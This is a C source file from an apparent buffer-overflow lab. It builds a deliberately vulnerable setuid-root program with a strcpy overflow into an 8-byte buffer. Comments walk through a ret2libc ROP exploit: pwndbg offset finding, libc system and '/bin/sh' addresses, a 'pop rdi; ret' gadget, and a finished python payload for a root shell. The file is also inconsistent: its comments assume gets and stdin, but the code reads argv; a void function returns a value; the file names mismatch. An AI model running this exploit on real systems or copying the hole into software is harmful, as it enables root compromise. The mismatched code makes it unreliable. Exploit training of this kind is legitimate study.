// AFTER => bof8.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

////////////////////////////////////////////////////////////
// COMPILE $ gcc -fno-stack-protector bof9.c -o bof9
// SETUID  $ sudo chown root:root bof9
//         $ sudo chmod 4755 bof9
////////////////////////////////////////////////////////////
// EXPLOIT
// ###### FIND distance FROM buf TO return address
//         pwndbg> i r rsp      # AT STARTING VULN FUNCTION
//              rsp : 0x7fffffffe628
//         pwndbg> nextcall     # UNTIL gets FUNCTION
//         pwndbg> i r rdi      # CHECK FIRST ARGUMENT of gets FUNCTION
//              rdi : 0x7fffffffe610
//         pwndbg> p/d 0x7fffffffe628 - 0x7fffffffe610
//              $2 = 24
////////////////////////////////////////////////////////////
// ###### FIND address of system FUNCTION
//         pwndbg> p system
//              $1 = ... 0x7ffff7a52390 <__libc_system>
////////////////////////////////////////////////////////////
// ###### FIND address of "/bin/sh" STRING
//         pwndbg> search /bin/sh
//              libc-2.23.so    0x7ffff7b99d57 /* '/bin/sh' */
////////////////////////////////////////////////////////////
// ###### FIND address of "pop rdi ; ret" gadget
//         $ ldd bof9           # CHECK library used by bof9
//         $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
//              0x0000000000021102 : pop rdi ; ret
//              0x0000000000021102 : pop rdi ; ret
//         pwndbg> vmmap
//              0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
//         pwndbg> p/x 0x0000000000021102 + 0x7ffff7a0d000
//              $1 = 0x7ffff7a2e102
////////////////////////////////////////////////////////////
// ###### MAKE payload!!!
// payload : [dummy byte (24)] + ["pop rdi ; ret" (8)] + ["/bin/sh" (8)] + [system (8)]
//         $ (python -c "print 'a'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
////////////////////////////////////////////////////////////


char * binsh = "/bin/sh";

void vuln(char * arg) {
    char buf[BUF_SIZE];

    if (setuid(0)) {
        perror("setuid");
        return 1;
    }
    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(func:SYSTEM -> %p)\n", system);
    printf("(string:binsh -> %p)\n", binsh);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
        return 1;
    }
    vuln(argv[1]);
    return 0;
}
